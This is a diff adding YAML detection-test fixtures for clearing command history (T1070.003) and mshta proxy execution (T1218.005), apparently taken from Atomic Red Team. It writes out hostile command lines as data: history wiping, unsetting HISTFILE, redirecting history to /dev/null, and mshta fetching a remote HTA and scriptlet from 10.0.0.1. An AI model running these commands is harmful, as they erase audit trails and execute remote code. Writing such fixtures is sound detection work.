@@ -1,0 +1,62 @@
+technique: T1070.003
+name: Clear Command History
+cases:
+  - name: history -c
+    source: atomic T1070.003
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: bash
+        cmd_line: "history -c"
+
+  - name: 清空 bash_history（重定向）
+    source: atomic T1070.003
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: bash
+        cmd_line: 'echo "" > ~/.bash_history'
+
+  - name: unset HISTFILE
+    source: atomic T1070.003
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: bash
+        cmd_line: "unset HISTFILE"
+
+  - name: HISTFILE 指向 /dev/null
+    source: atomic T1070.003
+    class: 1007
+    os: linux
+    event:
+      process:
+        name: ln
+        cmd_line: "ln -sf /dev/null ~/.bash_history"
+
+  - name: mshta 执行远程 hta
+    technique: T1218.005
+    source: atomic T1218.005
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: mshta.exe
+        file:
+          path: "C:\\Windows\\System32\\mshta.exe"
+        cmd_line: "mshta.exe http://10.0.0.1/payload.hta"
+
+  - name: mshta javascript 协议
+    technique: T1218.005
+    source: atomic T1218.005
+    class: 1007
+    os: windows
+    event:
+      process:
+        name: mshta.exe
+        file:
+          path: "C:\\Windows\\System32\\mshta.exe"
+        cmd_line: 'mshta.exe javascript:a=GetObject("script:http://10.0.0.1/a.sct").Exec();close();'
